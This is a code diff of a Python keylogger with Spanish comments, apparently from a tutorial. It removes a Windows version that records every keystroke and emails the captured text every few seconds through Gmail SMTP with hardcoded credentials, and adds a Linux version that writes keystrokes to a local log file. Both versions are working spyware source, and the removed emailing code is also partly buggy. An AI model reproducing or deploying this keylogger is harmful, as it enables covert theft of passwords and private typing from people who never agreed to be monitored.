@@ -1,81 +1,36 @@
-import pyHook, pythoncom, sys, logging, time, datetime
+import os
+from datetime import datetime
+import pyxhook
 
-carpeta_destino= 'C:\\Users\\17-w81\\Desktop\\KeyloggerYT\\KeyloggerYT.txt'
-segundos_espera = 7
+def main():
+    # Especifica el nombre del archivo (puede ser cambiado)
+    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
 
-timeout = time.time() + segundos_espera
+    # La función de registro con el parámetro {event}
+    def OnKeyPress(event):
+        with open(log_file, "a") as f:
+            if event.Key == 'Return':  # La tecla 'Enter' se llama 'Return' en pyxhook
+                f.write('\n')
+            else:
+                f.write(event.Key)  # Event.Key ya es el carácter correcto
 
-def TimeOut():
-    if time.time() > timeout:
-        return True
-    else:
-        return False
+    # Crea un objeto HookManager
+    new_hook = pyxhook.HookManager()
+    new_hook.KeyDown = OnKeyPress
 
-def EnviarEmail():
-    with open (carpeta_destino, 'r') as f:
-        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        data = f.read()
-        data = data.replace('Space', ' ')
-        data = data.replace('\n', '\n\n')
-        data = 'Mensaje capturado a las: ' + fecha + '\n' + data
-        print (data)
-
-        crearEmail('pruebaKeyloggerCB@gmail.com', 'prueba123', 'pruebakeyloggerCB@gmail.com', "Nueva captura:" +fecha, data)
-        f.seek(0)
-        f.truncate()
-
-def crearEmail(user, passw, recep, subj, body):
-    import smtplib
-
-    mailuser = user
-    mailPass = passw
-    From = user
-    To = recep
-    Subject= subj
-    Txt=body
-
-    email = """\From: %s\nTo: %s\nSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)
+    new_hook.HookKeyboard()  # Configura el hook
 
     try:
-        server=smtplib.SMTP("smtp.gmail.com", 587)
-        server.ehlo()
-        server.starttls()
-        server.login(mailUser, mailPass)
-        server.sendmail(From, To, email)
-        server.close()
-        print('Correo enviado con éxito!!')
+        new_hook.start()  # Inicia el hook
+    except KeyboardInterrupt:
+        # El usuario canceló desde la línea de comandos, así que cierra el listener
+        new_hook.cancel()
+    except Exception as ex:
+        # Escribe excepciones en el archivo de registro para análisis posterior
+        msg = f"Error mientras se capturaban los eventos:\n  {ex}"
+        print(msg)
+        with open(log_file, "a") as f:
+            f.write(f"\n{msg}")
 
-    except:
-        print('Correo fallido :(')
-
-def OnKeyboardEvent(event):
-    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format="%(message)s")
-
-    print("WindowName:", event.WindowName)
-    print('Window:', event.Window)
-
-    print("Key:", event.Key)
-    logging.log(18, event.Key)
-
-    return True
-
-# Crea un administrador de ganchos
-hm = pyHook.HookManager()
-
-# Registra el evento OnKeyboardEvent para que se ejecute cuando se presione una tecla
-hm.KeyDown = OnKeyboardEvent
-
-# Inicia el gancho del teclado
-hm.HookKeyboard()
-
-while True:
-    # Comprueba si ha pasado el tiempo de espera
-    if TimeOut():
-        # Envía un correo electrónico
-        EnviarEmail()
-
-        # Reinicia el tiempo de espera
-        timeout = time.time() + segundos_espera
-
-    # Espera mensajes en la cola de eventos
-    pythoncom.PumpWaitingMessages()
+if __name__ == "__main__":
+    main()
